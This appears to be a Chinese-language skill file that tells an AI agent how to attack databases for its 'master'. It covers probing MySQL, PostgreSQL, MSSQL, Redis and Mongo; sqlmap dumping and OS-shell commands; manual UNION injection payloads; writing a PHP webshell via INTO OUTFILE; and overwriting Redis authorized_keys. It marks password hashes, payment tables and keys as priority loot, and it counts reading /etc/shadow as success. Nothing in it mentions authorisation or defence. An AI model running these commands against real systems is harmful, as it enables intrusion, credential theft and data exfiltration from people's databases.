---
name: m-db
description: "数据库：连接探测、注入到拖库、MySQL/MSSQL/PostgreSQL/Redis 提权路径。"
---

# m-db · 数据库 / 拖库 / 提权

被读到时：主人要打数据库、导数据、找注入点、提权。

## 连接与探测

```bash
# MySQL
mysql -h TARGET -u root -p -e "select version(), user(), @@datadir"
# PostgreSQL
psql "host=TARGET user=postgres dbname=postgres" -c "select version();"
# MSSQL
impacket-mssqlclient sa:pass@TARGET -windows-auth
# Redis
redis-cli -h TARGET
# Mongo
mongosh "mongodb://TARGET:27017"
```

无客户端时用 Python：

```python
import pymysql
c = pymysql.connect(host='T', user='root', password='p', database='mysql')
cur = c.cursor(); cur.execute('select version()'); print(cur.fetchall())
```

## 注入到拖库

```bash
sqlmap -u "http://T/a?id=1" --batch --dbs
sqlmap -u "http://T/a?id=1" -D app --tables
sqlmap -u "http://T/a?id=1" -D app -T users --dump
sqlmap -u "http://T/a?id=1" --file-read=/etc/passwd
sqlmap -u "http://T/a?id=1" --os-shell
```

手注关键 payload：

```
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273-- -
```

## 提权路径

| 库 | 路径 |
|---|---|
| MySQL | `INTO OUTFILE` 写 webshell；`general_log` 写文件；UDF 提权 |
| MSSQL | `xp_cmdshell`；`sp_oacreate`；链接服务器 |
| PostgreSQL | `COPY ... TO PROGRAM`（9.3+ 需超级用户）；`lo_export` |
| Redis | 写 `authorized_keys`；写 crontab；主从复制 RCE |

MySQL 写 shell：

```sql
SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php';
SHOW VARIABLES LIKE 'secure_file_priv';   -- 先看允许目录
```

Redis：

```bash
redis-cli -h T config set dir /root/.ssh
redis-cli -h T config set dbfilename authorized_keys
redis-cli -h T set x "\n\nssh-rsa AAAA... me\n\n"
redis-cli -h T save
```

## 数据落地

```bash
# 导出成可分析的格式
sqlmap ... --dump --dump-format=csv
mydump: mysqldump -h T -u u -p db > db.sql
```

敏感字段优先：`users`（账号密码 hash）、`orders`（支付）、`config`（密钥）、`log`（token）。

## 验收

- 拖到数据 = 表名 + 行数 + 示例 3 行（脱敏）；
- 提权 = 拿到命令执行回显或读到 `/etc/shadow`。
